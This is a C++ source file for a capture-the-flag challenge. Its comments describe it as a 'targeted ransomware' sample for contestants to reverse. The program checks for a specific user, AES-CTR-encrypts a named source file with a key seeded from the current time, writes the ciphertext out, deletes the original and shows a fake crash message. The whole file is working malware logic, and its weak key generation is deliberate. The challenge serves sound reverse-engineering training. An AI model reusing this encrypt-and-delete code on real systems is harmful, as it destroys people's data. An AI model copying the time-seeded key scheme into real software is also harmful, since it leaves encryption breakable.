#include <ctime>
#include <string>
#include <cstring>
#include <climits>
#include <iostream>
#include <fstream>
#include "utils.h"
#include "aes.h"

using namespace std;
// Uncomment for easy replication and debugging
//#define DEBUG_MODE

const int TARGET_MAX_FILESIZE = 1024 * 1024;
const int SECONDS_TO_SLEEP = 4;
const string TARGET_USER = "buildmaster";
const string TARGET_FILE = "src/charmony/lib/strangefinder/splinesreticulator.cpp";
const string ENCRYPTED_FILENAME = "temp.bin";
const string TARGET_FIRST_LINE = "// Copyright 2019 - QwarkSoft";


uint8_t iv[16] = {0xe4, 0xb8, 0xc7, 0x5a, 0xcc, 0xb8, 0x77, 0xda, 0xb0, 0xf5, 0xa6, 0xf0, 0xa7, 0xaa, 0xe, 0x67};

int main()
{
	/*
		Exit if username is not the same as target user.
		CTFuser will need to patch this check to execute the rest of the sample.
	*/
#ifndef DEBUG_MODE
	if (get_current_username() != TARGET_USER)
	{
		return 0;
	}
#endif
	/*
		Attempt to find TARGET_FILE. Quit if not found.
		CTFuser will learn which file contains the encrypted flag.
	*/
	string file_to_encrypt = get_home_directory();
	if (!ends_with(file_to_encrypt, "/"))
	{
		file_to_encrypt += "/";
	}
	file_to_encrypt += TARGET_FILE;
	ifstream sr_file(file_to_encrypt, ios::in | ios::binary);
	if (!sr_file.is_open())
	{
#ifdef DEBUG_MODE
		cout << "Could not open " << TARGET_FILE << endl;
#endif
		return 0;
	}
	/*
		Get size of target file. Continue only if:
			TARGET_FIRST_LINE.length() < filesize < TARGET_MAX_FILESIZE
		This helps CTFuser get an idea about the size of the original unencrypted file.
	*/
	sr_file.seekg(0, ios::end);
	streampos sr_filesize = sr_file.tellg();
	if (sr_filesize >= TARGET_MAX_FILESIZE || sr_filesize <= TARGET_FIRST_LINE.length())
	{
#ifdef DEBUG_MODE
		cout << "File size is too small or too big for " << TARGET_FILE << endl;
#endif
		return 0;
	}
	/*
		Continue only if TARGET_FILE begins with TARGET_FIRST_LINE
		Presence of TARGET_FIRST_LINE at the beginning of the file informs the CTFuser
		that they've arrived at the correct key while bruteforcing decryption keys.
	*/
	sr_file.seekg(0, ios::beg);
	char *buf_first_line = new char[TARGET_FIRST_LINE.length()];
	sr_file.read(&buf_first_line[0], TARGET_FIRST_LINE.length());
	if (strcmp(TARGET_FIRST_LINE.c_str(), buf_first_line) != 0)
	{
		delete buf_first_line;
		sr_file.close();
		return 0;
	}
	delete buf_first_line;
	/*
		Read the entire file into memory.
		Generate "random" encryption key with current time as seed to srand().
		This is where the bulk of the difficulty lies for this challenge.
		CTFuser needs to realize that encryption can be broken due to insecure key generation.
	*/
	sr_file.seekg(0, ios::beg);
	unsigned char *buf_file_contents = new unsigned char[sr_filesize];
	sr_file.read((char*)&buf_file_contents[0], sr_filesize);
	sr_file.close();
	// Insecure key generation
	int current_unixtime = time(NULL);
	srand(current_unixtime);
	string crypt_key = random_string(32);
	
	uint8_t sbox[256];
	struct AES_ctx ctx;
	/*
		Encrypt file using "random" key using AES256 in CTR mode.
		CTFuser needs to realize that CTR mode is being used.
	*/
	initialize_aes_sbox(sbox);
	AES_init_ctx_iv(&ctx, (unsigned char*) crypt_key.c_str(), iv, sbox);
	AES_CTR_xcrypt_buffer(&ctx, buf_file_contents, sr_filesize, sbox);	
	// Sleep for a few seconds to simulate more work
	sleep(SECONDS_TO_SLEEP);

#ifdef DEBUG_MODE
	cout << "srand seed: " << current_unixtime << endl;
	cout << "Encryption Key: " << crypt_key << endl;
	hexdump("Encrypted Data:", buf_file_contents, sr_filesize);
#endif

	/*
		Dump encrypted file into ENCRYPTED_FILENAME within PWD.
		Delete the original file.
		This bit isn't necessary except to show that the sample
		is a targeted ransomware.
	*/
	char cwd[PATH_MAX];
	if (!getcwd(cwd, sizeof(cwd)))
	{
#ifdef DEBUG_MODE
		cout << "Could not get CWD" << endl;
#endif
		delete buf_file_contents;
		return 0;
	}
	string enc_filepath(cwd);
	enc_filepath += "/" + ENCRYPTED_FILENAME;
	ofstream sr_enc_file(enc_filepath, ios::out | ios::binary);
	if (!sr_enc_file.is_open())
	{
		delete buf_file_contents;
		return 0;
	}
	sr_enc_file.write((const char*)buf_file_contents, sr_filesize);
	sr_enc_file.close();
	// Delete original unencrypted file
	remove(file_to_encrypt.c_str());

#ifdef DEBUG_MODE
	// Confirm decryption works for encrypted file
	// Counter needs to be set back to 0x01 for decryption.
	uint8_t sbox2[256];
	struct AES_ctx ctx2;
	
	initialize_aes_sbox(sbox2);
	AES_init_ctx_iv(&ctx2, (unsigned char*) crypt_key.c_str(), iv, sbox2);
	AES_CTR_xcrypt_buffer(&ctx2, buf_file_contents, sr_filesize, sbox2);	
	
	hexdump("Decrypted Data:", buf_file_contents, sr_filesize);
	cout << buf_file_contents << endl;
#endif
	/*
		Display fake error message to CTFuser.
	*/
	delete buf_file_contents;
	cout << "Segmentation fault (core dumped)" << endl;
	return 0;
}
